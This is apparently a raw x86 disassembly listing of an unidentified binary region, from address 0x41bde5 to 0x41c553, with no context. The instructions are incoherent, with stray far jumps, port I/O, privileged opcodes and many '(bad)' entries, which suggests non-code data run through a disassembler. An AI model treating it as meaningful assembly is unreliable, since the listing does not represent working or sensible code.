  41bde5:	scas   eax,DWORD PTR es:[edi]
  41bde6:	or     esi,DWORD PTR [esi-0x3c75fb96]
  41bdec:	cwde   
  41bded:	push   ds
  41bdee:	jg     0x41bde9
  41bdf0:	cdq    
  41bdf1:	dec    DWORD PTR [edx-0x17343]
  41bdf7:	push   cs
  41bdf8:	and    BYTE PTR [eax-0x4],bh
  41bdfb:	call   FWORD PTR [ebx+eax*4-0x7d64ff1b]
  41be02:	xlat   BYTE PTR ds:[ebx]
  41be03:	add    ecx,DWORD PTR [esi+edi*8+0x565e97e]
  41be0a:	test   dl,dl
  41be0c:	pop    edi
  41be0d:	push   es
  41be0e:	add    BYTE PTR [ecx-0x80],cl
  41be11:	add    al,BYTE PTR [ebp+0xf]
  41be14:	ror    BYTE PTR [ebp-0x58a30001],1
  41be1a:	test   al,0x0
  41be1c:	pop    esp
  41be1d:	push   es
  41be1e:	cmp    bl,0x2c
  41be21:	add    eax,0x64fba84
  41be26:	add    BYTE PTR [eax-0x73f50a69],al
  41be2c:	cmp    dl,0xff
  41be2f:	dec    DWORD PTR [eax+edi*4+0x22bb0f35]
  41be36:	add    al,0x0
  41be38:	sbb    al,0x49
  41be3a:	dec    ebx
  41be3b:	or     BYTE PTR [esi],ah
  41be3d:	push   es
  41be3e:	or     edi,DWORD PTR [esi+0x0]
  41be44:	add    BYTE PTR [edi+0x27],cl
  41be47:	or     bh,bh
  41be49:	ret    0x7fc9
  41be4c:	call   0x8b90151d
  41be51:	xchg   esp,eax
  41be52:	dec    eax
  41be53:	xlat   BYTE PTR ds:[ebx]
  41be54:	call   0xfef45dce
  41be59:	fcmovu st,st(4)
  41be5b:	enter  0xaf10,0xc4
  41be5f:	cs or  al,0x7a
  41be62:	pop    ebp
  41be63:	or     BYTE PTR [esi*2+0x7e0759db],al
  41be6a:	pop    ecx
  41be6b:	stc    
  41be6c:	or     al,0xf7
  41be6e:	in     eax,0x2
  41be70:	add    BYTE PTR [ebp+0x54],dh
  41be73:	(bad)  
  41be74:	and    BYTE PTR [esi+0x6afccc5c],dh
  41be7a:	pop    edi
  41be7b:	fld    QWORD PTR [eax]
  41be7d:	jne    0x41be5a
  41be7f:	jns    0x41befe
  41be81:	jge    0x41bed5
  41be83:	xor    cl,BYTE PTR [esp+ecx*4]
  41be86:	out    dx,al
  41be87:	add    al,BYTE PTR [eax]
  41be89:	jne    0x41be24
  41be8b:	dec    ecx
  41be8c:	add    edi,edi
  41be8e:	adc    BYTE PTR [ebx],al
  41be90:	sub    BYTE PTR [eax+eiz*8-0x1],0x84
  41be95:	dec    edx
  41be96:	outs   dx,BYTE PTR ds:[esi]
  41be97:	into   
  41be98:	cld    
  41be99:	push   0x31
  41be9b:	mov    cl,0x39
  41be9d:	neg    DWORD PTR [edx+0x4c]
  41bea0:	inc    eax
  41bea1:	jne    0x41be7b
  41bea3:	test   edi,eax
  41bea5:	inc    eax
  41bea6:	push   eax
  41bea7:	iret   
  41bea8:	jg     0x41beaa
  41beaa:	add    BYTE PTR [eax],al
  41beac:	add    BYTE PTR [eax],al
  41beae:	cmp    al,0xe1
  41beb0:	inc    DWORD PTR [edx+0xdc6b]
  41beb6:	xor    esp,DWORD PTR [ecx-0x1f3effe]
  41bebc:	add    al,BYTE PTR [eax]
  41bebe:	jne    0x41bf1c
  41bec0:	leave  
  41bec1:	or     eax,0xf6838f89
  41bec6:	jp     0x41be57
  41bec8:	test   DWORD PTR [eax-0x97cf4cc],0x9486a877
  41bed2:	lock add DWORD PTR [esi],esp
  41bed5:	rcl    DWORD PTR [eax-0x3f],1
  41bed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bed9:	add    ah,BYTE PTR [ebp+0x74000002]
  41bedf:	add    ah,bh
  41bee1:	sar    DWORD PTR [eax],1
  41bee3:	add    eax,0x82744271
  41bee8:	inc    DWORD PTR [esi]
  41beea:	jo     0x41be6d
  41beec:	ins    BYTE PTR es:[edi],dx
  41beed:	iret   
  41beee:	mov    ecx,0xc399ddc8
  41bef3:	or     ebp,DWORD PTR [ecx+0x77]
  41bef6:	and    al,BYTE PTR [edx-0x19]
  41bef9:	add    dh,dh
  41befb:	push   eax
  41befc:	aam    0xd0
  41befe:	cdq    
  41beff:	or     edi,0xcb7f8007
  41bf05:	add    eax,0x49a50275
  41bf0a:	ja     0x41bf00
  41bf0c:	mov    edi,0xe70274af
  41bf11:	rol    DWORD PTR [eax],1
  41bf13:	add    BYTE PTR [eax],al
  41bf15:	add    BYTE PTR [eax],al
  41bf17:	mov    eax,0x74417103
  41bf1c:	sbb    BYTE PTR [edi+0x3c7f71fd],0xcf
  41bf23:	pop    ecx
  41bf24:	enter  0x99dd,0x43
  41bf28:	or     eax,0x42c27b69
  41bf2d:	out    0x0,eax
  41bf2f:	idiv   BYTE PTR [edi]
  41bf31:	je     0x41bf03
  41bf33:	cmp    DWORD PTR [ebx+0x7d81fa6f],eax
  41bf39:	fwait
  41bf3a:	add    eax,0x49250275
  41bf3f:	ja     0x41bf32
  41bf41:	aas    
  41bf42:	lahf   
  41bf43:	je     0x41bf47
  41bf45:	out    0x83,eax
  41bf47:	or     eax,0xec86f5fd
  41bf4c:	iret   
  41bf4d:	cmp    eax,0xff9071d0
  41bf52:	scas   al,BYTE PTR es:[edi]
  41bf53:	jo     0x41bed6
  41bf55:	out    0xd9,eax
  41bf57:	mov    esp,0x42d7ff3d
  41bf5c:	in     al,dx
  41bf5d:	inc    edi
  41bf5e:	xchg   ebp,eax
  41bf5f:	jne    0x41bf9b
  41bf61:	or     eax,0x15a6c
  41bf66:	jmp    0x1051b561
  41bf6b:	repnz add DWORD PTR [eax],eax
  41bf6e:	jmp    0x49b569
  41bf73:	sub    al,BYTE PTR [eax+eax*1]
  41bf76:	jmp    0xd045b571
  41bf7b:	add    BYTE PTR [eax],al
  41bf7d:	add    BYTE PTR [eax],al
  41bf7f:	add    BYTE PTR [ebp+0x4],cl
  41bf82:	add    cl,ch
  41bf84:	mov    eax,0xb805ff3d
  41bf89:	pop    edx
  41bf8a:	add    ch,cl
  41bf8c:	jbe    0x41c007
  41bf8e:	(bad)
  41bf91:	add    al,0x0
  41bf93:	jmp    0xdab54785
  41bf98:	cld    
  41bf99:	cld    
  41bf9a:	and    ebp,edx
  41bf9c:	jae    0x41bf2b
  41bf9e:	mov    edi,0xbfea199e
  41bfa3:	push   0x59
  41bfa5:	rol    BYTE PTR [eax+0xda60a9],cl
  41bfab:	fidiv  DWORD PTR [esi]
  41bfad:	pop    es
  41bfae:	mov    BYTE PTR [edi],ch
  41bfb0:	jo     0x41c02b
  41bfb2:	jl     0x41bf95
  41bfb4:	in     eax,dx
  41bfb5:	lds    ecx,FWORD PTR [ebp*2-0x16fffb9b]
  41bfbc:	scas   eax,DWORD PTR es:[edi]
  41bfbd:	mov    ch,0xfc
  41bfbf:	ds cld 
  41bfc1:	xchg   BYTE PTR [eiz*2+0x56fcd356],cl
  41bfc8:	lahf   
  41bfc9:	cmp    eax,0xfafa0515
  41bfce:	add    al,0x0
  41bfd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfd1:	retf   0xfff1
  41bfd4:	inc    ebx
  41bfd5:	jle    0x41bfce
  41bfd7:	or     dl,BYTE PTR [ebx]
  41bfd9:	jp     0x41bfe9
  41bfdb:	mul    DWORD PTR [ebx-0x27998049]
  41bfe1:	add    dh,dh
  41bfe3:	inc    esi
  41bfe4:	add    BYTE PTR [eax],al
  41bfe6:	add    BYTE PTR [eax],al
  41bfe8:	add    bl,ch
  41bfea:	or     BYTE PTR [ebx],0x85
  41bfed:	ss add al,0x0
  41bff0:	add    BYTE PTR [esi-0x28],dl
  41bff3:	xchg   bl,al
  41bff5:	pushf  
  41bff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bff7:	(bad)  
  41bff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bff9:	lods   al,BYTE PTR ds:[esi]
  41bffa:	sub    DWORD PTR [eax+ebp*4],edx
  41bffd:	int    0xc7
  41bfff:	xor    esi,0x8b00029d
  41c005:	pop    edx
  41c006:	mov    BYTE PTR [edi-0x32b46fb2],0xb
  41c00d:	(bad)  [ecx]
  41c00f:	jnp    0x5506aef
  41c015:	pushf  
  41c016:	add    al,BYTE PTR [ecx+0x7d5048c0]
  41c01c:	jecxz  0x41bfad
  41c01e:	(bad)  
  41c01f:	mov    dl,0xc3
  41c021:	aaa    
  41c022:	test   BYTE PTR [edi],bl
  41c024:	rcr    edi,0xb9
  41c027:	sti    
  41c028:	je     0x41c08f
  41c02a:	rol    BYTE PTR [edx+0x1],0x40
  41c02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c02f:	mov    DWORD PTR [ecx],0xe380025c
  41c035:	pop    edi
  41c036:	cs adc ch,al
  41c039:	mov    ds:0xc9fffffd,al
  41c03e:	shl    DWORD PTR [eax+0x9],0xda
  41c042:	aas    
  41c043:	std    
  41c044:	cmp    al,0xc5
  41c046:	ins    DWORD PTR es:[edi],dx
  41c047:	std    
  41c048:	dec    DWORD PTR [ecx+ecx*2]
  41c04b:	ret    
  41c04c:	call   0x41c051
  41c051:	add    BYTE PTR [ebp+0x13],dh
  41c054:	add    eax,0xc15e7500
  41c059:	or     al,0xf1
  41c05b:	mov    ds:0xc902fccd,eax
  41c060:	rol    BYTE PTR [ebx-0x408822e2],0x3d
  41c067:	pop    eax
  41c068:	loope  0x41c074
  41c06a:	neg    BYTE PTR [ebx]
  41c06c:	add    eax,0xcde42de7
  41c071:	cld    
  41c072:	imul   BYTE PTR [edi+0x24]
  41c075:	sbb    BYTE PTR [ebp+0x6e],dh
  41c078:	clc    
  41c079:	mov    BYTE PTR [ecx],dh
  41c07b:	mov    bh,0xf0
  41c07d:	xchg   BYTE PTR [ecx],bh
  41c07f:	mov    edi,0xb73188e8
  41c084:	and    al,0x48
  41c086:	cld    
  41c087:	lahf   
  41c088:	and    al,0x10
  41c08a:	pushf  
  41c08b:	add    DWORD PTR es:[eax],eax
  41c08e:	jne    0x41c064
  41c090:	xchg   edx,eax
  41c091:	shr    bh,0x5b
  41c094:	lods   al,BYTE PTR ds:[esi]
  41c095:	imul   esi,DWORD PTR ds:0x7afd0cdb,0x57
  41c09c:	aaa    
  41c09d:	add    dh,BYTE PTR [ebp-0x25]
  41c0a0:	sti    
  41c0a1:	mov    ebp,0x457932b5
  41c0a6:	jge    0x41c10a
  41c0a8:	ss or  al,0x33
  41c0ab:	adc    eax,0xa4c3401
  41c0b0:	add    DWORD PTR [eax],eax
  41c0b2:	jne    0x41c10f
  41c0b4:	(bad)  
  41c0b5:	or     al,BYTE PTR [eax]
  41c0b7:	add    BYTE PTR [eax],al
  41c0b9:	add    BYTE PTR [eax],al
  41c0bb:	enter  0xc2e2,0x45
  41c0bf:	je     0x41c046
  41c0c1:	fld    DWORD PTR [eax+0x74]
  41c0c4:	fild   DWORD PTR [eax]
  41c0c6:	or     eax,0x8f799803
  41c0cb:	dec    ebp
  41c0cc:	mov    DWORD PTR [eax+0x0],0xcd6101f5
  41c0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0d4:	in     eax,dx
  41c0d5:	leavew 
  41c0d7:	pop    ebp
  41c0d8:	dec    esi
  41c0d9:	loopne 0x41c05e
  41c0db:	or     eax,0x7886de22
  41c0e0:	add    bh,ah
  41c0e2:	add    edi,DWORD PTR [ebx]
  41c0e4:	cmp    al,0xe8
  41c0e6:	push   ss
  41c0e7:	adc    ah,ah
  41c0e9:	out    0x3,eax
  41c0eb:	jne    0x41c166
  41c0ed:	lods   al,BYTE PTR ds:[esi]
  41c0ee:	(bad)  
  41c0ef:	std    
  41c0f0:	cmp    ebp,edi
  41c0f2:	js     0x41c0a5
  41c0f4:	hlt    
  41c0f5:	inc    edx
  41c0f6:	ret    
  41c0f7:	jbe    0x41c0bc
  41c0f9:	push   es
  41c0fa:	or     ah,bh
  41c0fc:	test   eax,0x6ab48ddd
  41c101:	jmp    0xc1fa26b1
  41c106:	mov    esp,0x3688069
  41c10b:	jne    0x41c10f
  41c10d:	jbe    0x41c109
  41c10f:	ins    DWORD PTR es:[edi],dx
  41c110:	and    al,0xef
  41c112:	cld    
  41c113:	hlt    
  41c114:	dec    esp
  41c115:	call   0xa9bb361d
  41c11a:	and    dl,dl
  41c11c:	or     dh,0xcc
  41c11f:	add    BYTE PTR [eax],al
  41c121:	add    BYTE PTR [eax],al
  41c123:	add    BYTE PTR [ecx+0x7e],bh
  41c126:	push   eax
  41c127:	add    esi,DWORD PTR [ebp+0x2]
  41c12a:	jo     0x41c159
  41c12c:	ins    DWORD PTR es:[edi],dx
  41c12d:	jnp    0x41c153
  41c12f:	add    BYTE PTR [edx-0x57],bl
  41c132:	out    0x3,al
  41c134:	jne    0x41c0b8
  41c136:	mov    eax,ds:0xb77d71fe
  41c13b:	add    esi,DWORD PTR [ebp+0x2]
  41c13e:	add    BYTE PTR [eax-0x31f382e],0xf7
  41c145:	test   DWORD PTR [ebx-0x34],edi
  41c148:	inc    ecx
  41c149:	js     0x41c16f
  41c14b:	cld    
  41c14c:	cmc    
  41c14d:	pop    esp
  41c14e:	add    ch,ch
  41c150:	jbe    0x41c14b
  41c152:	inc    ebp
  41c153:	ffree  st(3)
  41c155:	cli    
  41c156:	jg     0x41c14f
  41c158:	push   esi
  41c159:	fistp  DWORD PTR [eax-0x3a38d6ac]
  41c15f:	scas   eax,DWORD PTR es:[edi]
  41c160:	ja     0x41c16d
  41c162:	out    0x80,eax
  41c164:	jbe    0x41c168
  41c166:	add    BYTE PTR [edx-0x45],dh
  41c169:	test   BYTE PTR [eax-0x770dad43],0xa7
  41c170:	bnd jp 0x41c1d0
  41c173:	loope  0x41c102
  41c175:	mov    ebp,0x6ce6ac00
  41c17a:	cmp    BYTE PTR [ebx],dh
  41c17c:	inc    ecx
  41c17d:	clc    
  41c17e:	jno    0x41c16d
  41c180:	jge    0x41c12c
  41c182:	jo     0x41c169
  41c184:	dec    ebp
  41c185:	ret    0x1888
  41c188:	add    BYTE PTR [eax],al
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	add    ch,dh
  41c18e:	inc    edi
  41c18f:	and    al,0xe1
  41c191:	jbe    0x41c1e2
  41c193:	add    al,0x60
  41c195:	inc    edx
  41c196:	push   ds
  41c197:	sbb    dl,al
  41c199:	fidivr WORD PTR [eax+0x43]
  41c19c:	out    dx,al
  41c19d:	scas   eax,DWORD PTR es:[edi]
  41c19e:	jl     0x41c1e3
  41c1a0:	add    eax,0x62c9eaa1
  41c1a5:	mov    edx,0x5f60befa
  41c1aa:	cli    
  41c1ab:	xchg   BYTE PTR [edi],dh
  41c1ad:	jge    0x41c1ff
  41c1af:	arpl   WORD PTR [edi-0x3dc93cc9],sp
  41c1b5:	sahf   
  41c1b6:	cmp    al,0xdc
  41c1b9:	outs   dx,DWORD PTR ds:[esi]
  41c1ba:	or     BYTE PTR [edx-0x64],0x2e
  41c1be:	mov    BYTE PTR [eax-0x156ae3],0xae
  41c1c5:	mov    bh,0xc3
  41c1c7:	cmp    DWORD PTR ds:0x7c798a,edx
  41c1cd:	and    BYTE PTR [edx+0x442874fb],al
  41c1d3:	push   ecx
  41c1d4:	and    al,0x44
  41c1d6:	inc    esp
  41c1d7:	inc    ecx
  41c1d8:	and    al,0x4c
  41c1da:	in     al,0xc1
  41c1dc:	push   eax
  41c1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1de:	mov    bl,bh
  41c1e0:	xlat   BYTE PTR ds:[ebx]
  41c1e1:	xchg   ecx,eax
  41c1e2:	mov    esi,0x40960a70
  41c1e7:	adc    esp,DWORD PTR [edx+edx*4]
  41c1ea:	retf   0x8802
  41c1ed:	ror    bh,cl
  41c1ef:	xchg   BYTE PTR [esi+0x0],al
  41c1f2:	add    BYTE PTR [eax],al
  41c1f4:	add    BYTE PTR [eax],al
  41c1f6:	and    esp,ebx
  41c1f8:	jp     0x41c182
  41c1fa:	and    bl,ah
  41c1fc:	or     cl,BYTE PTR [edi]
  41c1fe:	push   ecx
  41c1ff:	aam    0xef
  41c201:	call   FWORD PTR [ebx+0x7424607b]
  41c207:	(bad)  
  41c208:	out    0x11,al
  41c20a:	pop    esp
  41c20b:	mov    bl,0x6
  41c20d:	sqrtps xmm6,XMMWORD PTR [edi+0x7b7bfff0]
  41c214:	bound  eax,QWORD PTR [esp+ecx*8]
  41c217:	rol    BYTE PTR [edx+0x1],0xef
  41c21b:	mov    bh,0x40
  41c21d:	and    al,0xcc
  41c21f:	inc    ebx
  41c220:	inc    ecx
  41c221:	and    al,0x9c
  41c223:	inc    ebx
  41c224:	cmc    
  41c225:	cmp    edx,DWORD PTR [eax+0x22]
  41c228:	and    al,0xf
  41c22a:	and    DWORD PTR [ebx-0x13],edx
  41c22d:	(bad)  
  41c22e:	mov    ebx,0xf085a43
  41c233:	cmp    esp,DWORD PTR [esp+ebx*1]
  41c236:	mov    edi,es
  41c238:	sub    cl,0x5c
  41c23b:	push   es
  41c23c:	add    BYTE PTR [ebx-0x3f7e4161],cl
  41c242:	imul   eax,DWORD PTR [edx-0x25],0x0
  41c246:	dec    esp
  41c247:	push   es
  41c248:	xchg   DWORD PTR [ebp+esi*2-0x31],edx
  41c24c:	in     al,0x88
  41c24e:	cmp    al,ch
  41c250:	xor    al,0x24
  41c252:	popa   
  41c253:	sbb    bh,BYTE PTR [ebp-0x33]
  41c256:	cmp    bl,BYTE PTR [edi+edi*2+0xbf]
  41c25d:	add    BYTE PTR [eax],al
  41c25f:	test   eax,0x82457aa5
  41c264:	mov    DWORD PTR [ebp+0x3f33760b],0xf16a2315
  41c26e:	jl     0x41c1f2
  41c270:	das    
  41c271:	xchg   edx,eax
  41c272:	dec    DWORD PTR [edx]
  41c274:	lods   al,BYTE PTR ds:[esi]
  41c275:	jge    0x41c23b
  41c277:	or     al,0x2a
  41c279:	aam    0xfc
  41c27b:	cli    
  41c27c:	xor    eax,0x2299153f
  41c281:	cmc    
  41c282:	push   es
  41c283:	fcomp  QWORD PTR [ebx+0x1]
  41c286:	add    BYTE PTR [ebp+0x35],dh
  41c289:	aas    
  41c28a:	adc    eax,0x17f48391
  41c28f:	fsubr  QWORD PTR [edi]
  41c291:	add    DWORD PTR [eax],eax
  41c293:	jne    0x41c2ba
  41c295:	aas    
  41c296:	adc    eax,0xaf53699
  41c29b:	into   
  41c29c:	test   BYTE PTR [edx+0x45],bh
  41c29f:	mov    cl,bh
  41c2a1:	outs   dx,DWORD PTR ds:[esi]
  41c2a2:	or     eax,DWORD PTR [eax+0x3b8a5304]
  41c2a8:	rcr    BYTE PTR [esi+edx*4],0x69
  41c2ac:	mov    ecx,0xf1ff66db
  41c2b1:	out    dx,al
  41c2b2:	and    esi,eax
  41c2b4:	(bad)  
  41c2b6:	xchg   DWORD PTR [ebx],edi
  41c2b8:	loopne 0x41c293
  41c2ba:	push   edi
  41c2bb:	test   BYTE PTR [eax-0x3cc4773a],al
  41c2c1:	jle    0x41c2c4
  41c2c3:	add    BYTE PTR [eax],al
  41c2c5:	add    BYTE PTR [eax],al
  41c2c7:	add    BYTE PTR [ebp-0x55],dh
  41c2ca:	jge    0x41c28b
  41c2cc:	jmp    0x70bfbcd3
  41c2d1:	out    0xe9,al
  41c2d3:	clc    
  41c2d4:	or     dl,al
  41c2d6:	popf   
  41c2d7:	lods   al,BYTE PTR ds:[esi]
  41c2d8:	ins    DWORD PTR es:[edi],dx
  41c2d9:	ret    0xe469
  41c2dc:	inc    ebp
  41c2dd:	test   DWORD PTR [esi-0x45fab20d],esp
  41c2e3:	ret    
  41c2e4:	jb     0x41c270
  41c2e6:	sub    al,0x3
  41c2e8:	cld    
  41c2e9:	inc    eax
  41c2ea:	iret   
  41c2eb:	jle    0x41c30e
  41c2ed:	adc    DWORD PTR [ebx+0x12],ebp
  41c2f0:	daa    
  41c2f1:	rcr    DWORD PTR [ebp+0x7d],0x40
  41c2f5:	sar    DWORD PTR ds:0x6310ca7f,0x1e
  41c2fc:	pop    es
  41c2fd:	rol    DWORD PTR [ebp+0x7e],0xb0
  41c301:	sbb    DWORD PTR [ebx],eax
  41c303:	cmp    DWORD PTR [esi+0x9],0xab80425f
  41c30a:	rcl    ebp,1
  41c30c:	loope  0x41c2ce
  41c30e:	jo     0x41c352
  41c310:	and    dh,0x75
  41c313:	clc    
  41c314:	imul   ebp,DWORD PTR [ebp+0x19307ded],0x1b6e6ac3
  41c31e:	outs   dx,DWORD PTR ds:[esi]
  41c31f:	inc    edx
  41c320:	pusha  
  41c321:	mov    WORD PTR [eax+esi*8+0x7ee640da],fs
  41c328:	call   0x0:0xc8edb1
  41c32f:	add    BYTE PTR [eax],al
  41c331:	push   esi
  41c332:	sahf   
  41c333:	repnz out 0x8d,eax
  41c336:	mov    ebp,DWORD PTR [ecx+0x47]
  41c339:	pop    ecx
  41c33a:	push   ss
  41c33b:	out    0x4f,eax
  41c33d:	pop    ebx
  41c33e:	lea    ebp,[ecx]
  41c340:	clc    
  41c341:	test   ecx,0x55ec213a
  41c347:	add    esi,eax
  41c349:	std    
  41c34a:	iret   
  41c34b:	inc    DWORD PTR [ecx]
  41c34d:	lods   eax,DWORD PTR ds:[esi]
  41c34e:	out    0x13,al
  41c350:	sbb    al,ah
  41c352:	int    0xfc
  41c354:	mov    ecx,0xf3737fdb
  41c359:	rol    BYTE PTR [ebp+0x15],1
  41c35c:	int    0xca
  41c35e:	or     eax,DWORD PTR [ecx+eiz*2]
  41c361:	mov    ah,0x15
  41c363:	imul   BYTE PTR [edi]
  41c365:	inc    esp
  41c366:	aas    
  41c367:	or     eax,0xfcbf2264
  41c36c:	jbe    0x41c35f
  41c36e:	cmp    esp,DWORD PTR [ecx+ecx*8]
  41c371:	jbe    0x41c3a9
  41c373:	cs jb  0x41c327
  41c376:	push   es
  41c377:	sub    DWORD PTR [ecx],0xffffffc2
  41c37a:	in     eax,0x88
  41c37c:	mov    ebp,0x1e88e26a
  41c381:	popa   
  41c382:	dec    esi
  41c383:	and    al,0x9
  41c385:	inc    esi
  41c386:	mov    ebp,ecx
  41c388:	ds test DWORD PTR es:[edi+0x4589e8bd],edi
  41c390:	(bad)  
  41c391:	add    BYTE PTR [ebx+ecx*1+0xeb],0x0
  41c399:	add    BYTE PTR [esi+0x45],bl
  41c39c:	adc    eax,0x7d153417
  41c3a1:	out    0x4b,al
  41c3a3:	fdivp  st(5),st
  41c3a5:	push   cs
  41c3a6:	lods   eax,DWORD PTR ds:[esi]
  41c3a7:	cmp    BYTE PTR [ebx-0x33],0xce
  41c3ab:	mov    edi,0x4231cd70
  41c3b0:	adc    al,0x6c
  41c3b2:	mov    dh,0x33
  41c3b4:	and    esp,DWORD PTR [edx+0x52]
  41c3b7:	out    0x17,al
  41c3b9:	jb     0x41c39d
  41c3bb:	jmp    0xb9fc:0xcd0e38c9
  41c3c2:	hlt    
  41c3c3:	jg     0x41c438
  41c3c5:	jecxz  0x41c3c3
  41c3c7:	inc    esp
  41c3c8:	adc    eax,0x9406800
  41c3cd:	push   es
  41c3ce:	in     al,0x0
  41c3d0:	adc    esi,esi
  41c3d2:	call   0xfa9a:0xd90f7baf
  41c3d9:	call   DWORD PTR [ebx]
  41c3db:	cmp    eax,DWORD PTR [edx+0x10]
  41c3de:	xchg   ebx,eax
  41c3df:	call   0xe93b4f3a
  41c3e4:	ror    DWORD PTR [esp+ecx*2],0x33
  41c3e8:	inc    ebx
  41c3e9:	xchg   edi,eax
  41c3ea:	lea    eax,[esi]
  41c3ec:	gs xchg ebp,eax
  41c3ee:	pop    ebp
  41c3ef:	push   es
  41c3f0:	mov    al,ds:0xcc065d97
  41c3f5:	xchg   edi,eax
  41c3f6:	dec    ebp
  41c3f7:	push   es
  41c3f8:	out    dx,eax
  41c3f9:	xchg   edi,eax
  41c3fa:	int    0x2
  41c3fc:	add    DWORD PTR [eax+0x0],ebx
  41c402:	add    ch,bl
  41c404:	add    dl,BYTE PTR [ebx]
  41c406:	cwde   
  41c407:	fld    QWORD PTR [edx]
  41c409:	and    eax,0x3702cd98
  41c40e:	cwde   
  41c40f:	int    0x2
  41c411:	push   ebx
  41c412:	cwde   
  41c413:	sbb    eax,0x1d98a003
  41c418:	add    edi,DWORD PTR [eax+ebx*4-0x6716fcf3]
  41c41f:	or     eax,0x1d991e03
  41c424:	add    ebx,DWORD PTR [edi-0x67]
  41c427:	sbb    eax,0xd997f03
  41c42c:	add    edx,DWORD PTR [ecx+ebx*4-0x65a2fcf3]
  41c433:	fld    QWORD PTR [edx]
  41c435:	rcr    DWORD PTR [ebx-0x63fafd23],0xcd
  41c43c:	add    al,BYTE PTR ds:0x5064d9c
  41c442:	pushf  
  41c443:	pop    ebp
  41c444:	push   es
  41c445:	add    eax,0x3ea759c
  41c44a:	pop    es
  41c44b:	loope  0x41c436
  41c44d:	add    eax,DWORD PTR [edi]
  41c44f:	fldl2t 
  41c451:	add    ebx,DWORD PTR [edx]
  41c453:	adc    ebx,ebp
  41c455:	add    ebx,DWORD PTR [edx]
  41c457:	or     ebx,ebp
  41c459:	add    eax,DWORD PTR [edi]
  41c45b:	add    ebx,ebp
  41c45d:	add    ebx,DWORD PTR [edx]
  41c45f:	stc    
  41c460:	jmp    0x1a03:0xeaf11a03
  41c467:	add    BYTE PTR [eax],al
  41c469:	add    BYTE PTR [eax],al
  41c46b:	add    cl,ch
  41c46d:	jmp    0x1a03:0xeae11a03
  41c474:	fldl2e 
  41c476:	add    ebx,DWORD PTR [edx]
  41c478:	adc    ebx,ebp
  41c47a:	add    ecx,DWORD PTR [ecx+ecx*1+0x1a503eb]
  41c481:	jmp    0x41c486
  41c483:	mov    bh,0xf9
  41c485:	push   0x0
  41c487:	leave  
  41c488:	icebp  
  41c489:	push   0x0
  41c48b:	fucomi st,st(1)
  41c48d:	push   0x0
  41c48f:	in     eax,dx
  41c490:	loope  0x41c4fc
  41c492:	add    BYTE PTR ds:0x1f006ad8,cl
  41c498:	adc    BYTE PTR [ebx+0x0],ch
  41c49b:	aas    
  41c49c:	or     BYTE PTR [ebx+0x0],ch
  41c49f:	pop    ebx
  41c4a0:	add    BYTE PTR [ebx+0x0],ch
  41c4a3:	cdq    
  41c4a4:	add    BYTE PTR [ebx+0x0],ch
  41c4a7:	loopne 0x41c499
  41c4a9:	push   0x0
  41c4ab:	mov    edx,ebp
  41c4ad:	push   0x0
  41c4af:	mov    cl,0xe8
  41c4b1:	push   0x0
  41c4b3:	or     esp,ebx
  41c4b5:	push   0x0
  41c4b7:	jecxz  0x41c48d
  41c4b9:	push   0x0
  41c4bb:	sbb    al,0xd6
  41c4bd:	push   0x0
  41c4bf:	inc    eax
  41c4c0:	(bad)  
  41c4c1:	push   0x0
  41c4c3:	mov    ch,0xd6
  41c4c5:	add    ch,BYTE PTR [eax]
  41c4c7:	add    al,0xb7
  41c4c9:	popa   
  41c4ca:	daa    
  41c4cb:	add    al,0x5d
  41c4cd:	xchg   esp,eax
  41c4ce:	daa    
  41c4cf:	add    al,0x0
  41c4d1:	add    BYTE PTR [eax],al
  41c4d3:	add    BYTE PTR [eax],al
  41c4d5:	push   cs
  41c4d6:	pusha  
  41c4d7:	daa    
  41c4d8:	add    al,0x8d
  41c4da:	popa   
  41c4db:	daa    
  41c4dc:	add    al,0xa7
  41c4de:	data16 daa 
  41c4e0:	add    al,0xf5
  41c4e2:	gs daa 
  41c4e4:	add    al,0x7
  41c4e6:	xchg   esp,eax
  41c4e7:	daa    
  41c4e8:	add    al,0x58
  41c4ea:	pusha  
  41c4eb:	daa    
  41c4ec:	add    al,0x9b
  41c4ee:	pusha  
  41c4ef:	daa    
  41c4f0:	add    al,0x73
  41c4f2:	pushf  
  41c4f3:	daa    
  41c4f4:	add    al,0x68
  41c4f6:	pushf  
  41c4f7:	daa    
  41c4f8:	add    al,0x8d
  41c4fa:	pushf  
  41c4fb:	daa    
  41c4fc:	add    al,0xbb
  41c4fe:	pushf  
  41c4ff:	daa    
  41c500:	add    al,0xa3
  41c502:	pushf  
  41c503:	daa    
  41c504:	add    al,0xa
  41c506:	pushf  
  41c507:	daa    
  41c508:	add    al,0xda
  41c50a:	fwait
  41c50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c50c:	add    ebx,DWORD PTR [edx]
  41c50e:	pushf  
  41c50f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c510:	add    edi,DWORD PTR [edx-0x63]
  41c513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c514:	add    esi,DWORD PTR [edx-0x63]
  41c517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c518:	add    ebp,DWORD PTR [edx-0x63]
  41c51b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c51c:	add    eax,DWORD PTR [edx+0x4403a79d]
  41c522:	mov    ah,dl
  41c524:	int    0xb5
  41c526:	add    BYTE PTR [ebx-0x4b8a97bf],dh
  41c52c:	out    dx,eax
  41c52d:	sub    DWORD PTR [ecx-0x64aea5d9],ecx
  41c533:	mov    ch,0xcc
  41c535:	rcr    DWORD PTR [edx+ebp*2-0x34],0x0
  41c53a:	add    BYTE PTR [eax],al
  41c53c:	add    BYTE PTR [eax],al
  41c53e:	mov    ebx,0xbe8bd630
  41c543:	add    edi,esp
  41c545:	add    edx,DWORD PTR [ebx]
  41c547:	stc    
  41c548:	jmp    DWORD PTR [eax]
  41c54a:	inc    ebp
  41c54b:	loope  0x41c4cd
  41c54d:	sub    DWORD PTR ds:0x42b13924,edx
  41c553:	sbb    DWORD PTR [edx+0x1a4b6aa],ecx
